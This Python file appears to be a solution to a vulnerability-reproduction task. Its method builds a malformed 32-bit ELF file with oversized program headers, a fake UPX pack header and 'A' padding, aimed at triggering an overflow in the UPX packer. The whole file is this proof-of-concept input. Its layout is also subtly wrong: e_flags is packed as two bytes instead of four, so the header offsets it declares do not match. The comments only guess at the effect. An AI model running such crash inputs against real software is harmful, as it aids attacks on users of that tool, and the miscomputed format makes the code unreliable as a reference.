import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal 32-bit ELF shared library header (ET_DYN, i386)
        e_ident = b'\x7fELF\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        e_type = struct.pack('<H', 3)  # ET_DYN
        e_machine = struct.pack('<H', 3)  # EM_386
        e_version = struct.pack('<L', 1)
        e_entry = struct.pack('<L', 0x0)
        e_phoff = struct.pack('<L', 52)  # Program header offset
        e_shoff = struct.pack('<L', 0)
        e_flags = struct.pack('<H', 0)
        e_ehsize = struct.pack('<H', 52)
        e_phentsize = struct.pack('<H', 32)
        e_phnum = struct.pack('<H', 3)  # Increased phnum to potentially trigger issues
        e_shentsize = struct.pack('<H', 0)
        e_shnum = struct.pack('<H', 0)
        e_shstrndx = struct.pack('<H', 0)
        elf_header = e_ident + e_type + e_machine + e_version + e_entry + e_phoff + e_shoff + e_flags + e_ehsize + e_phentsize + e_phnum + e_shentsize + e_shnum + e_shstrndx

        # Program header 1: PT_LOAD with large filesz to trigger potential overflow
        p_type1 = struct.pack('<L', 1)  # PT_LOAD
        p_offset1 = struct.pack('<L', 0)
        p_vaddr1 = struct.pack('<L', 0x08048000)
        p_paddr1 = struct.pack('<L', 0x08048000)
        p_filesz1 = struct.pack('<L', 1024)  # Large size for overflow
        p_memsz1 = struct.pack('<L', 1024)
        p_flags1 = struct.pack('<L', 5)  # PF_R | PF_X
        p_align1 = struct.pack('<L', 0x1000)
        ph1 = p_type1 + p_offset1 + p_vaddr1 + p_paddr1 + p_filesz1 + p_memsz1 + p_flags1 + p_align1

        # Program header 2: PT_DYNAMIC for DT_INIT trigger
        p_type2 = struct.pack('<L', 6)  # PT_DYNAMIC
        p_offset2 = struct.pack('<L', 256)
        p_vaddr2 = struct.pack('<L', 0x08049000)
        p_paddr2 = struct.pack('<L', 0x08049000)
        p_filesz2 = struct.pack('<L', 512)  # Size to cause issues
        p_memsz2 = struct.pack('<L', 512)
        p_flags2 = struct.pack('<L', 4)  # PF_R
        p_align2 = struct.pack('<L', 4)
        ph2 = p_type2 + p_offset2 + p_vaddr2 + p_paddr2 + p_filesz2 + p_memsz2 + p_flags2 + p_align2

        # Program header 3: Another PT_LOAD with malformed values
        p_type3 = struct.pack('<L', 1)
        p_offset3 = struct.pack('<L', 128)
        p_vaddr3 = struct.pack('<L', 0x0804a000)
        p_paddr3 = struct.pack('<L', 0x0804a000)
        p_filesz3 = struct.pack('<L', 2048)  # Even larger
        p_memsz3 = struct.pack('<L', 2048)
        p_flags3 = struct.pack('<L', 6)  # PF_R | PF_W
        p_align3 = struct.pack('<L', 0x1000)
        ph3 = p_type3 + p_offset3 + p_vaddr3 + p_paddr3 + p_filesz3 + p_memsz3 + p_flags3 + p_align3

        # Simulate UPX magic in the data area (after headers, place "UPX!" or similar)
        upx_magic = b'UPX! ' + struct.pack('<L', 0xdeadbeef)  # Fake pack header with method 0xdeadbeef to mess with ph.method

        # Pad with pattern to reach 512 bytes, potentially causing overflow in lowmem or decompression
        pattern = b'A' * (512 - len(elf_header + ph1 + ph2 + ph3 + upx_magic))
        poc = elf_header + ph1 + ph2 + ph3 + upx_magic + pattern
        return poc[:512]  # Ensure exactly 512 bytes
